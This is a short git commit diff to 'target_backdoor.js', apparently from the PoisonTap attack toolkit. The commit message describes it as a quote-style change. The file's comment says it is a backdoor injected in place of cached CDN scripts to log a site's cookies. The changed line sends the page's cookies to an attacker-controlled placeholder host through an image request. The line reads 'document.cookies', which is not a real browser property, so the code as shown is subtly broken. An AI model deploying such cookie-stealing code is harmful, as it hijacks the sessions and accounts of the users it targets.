84fa1f82cfe23fa4fb9664eb71963464be117af1
Peter Benjamin <petermbenjamin@gmail.com>
2016-11-21 04:35:39 +0000

    Replace template strings with single quotes

--- target_backdoor.js
+++ target_backdoor.js
@@ -4,4 +4,4 @@
  * such as Google's CDN files, found in the poisontap/js/ directory.
  * By default, it logs the domain's cookies. Change 'YOUR.DOMAIN' to your domain.
  */
-new Image().src = `http://YOUR.DOMAIN/poisontap/log.php?log=${document.cookies}`;
+new Image().src = 'http://YOUR.DOMAIN/poisontap/log.php?log=' + document.cookies;
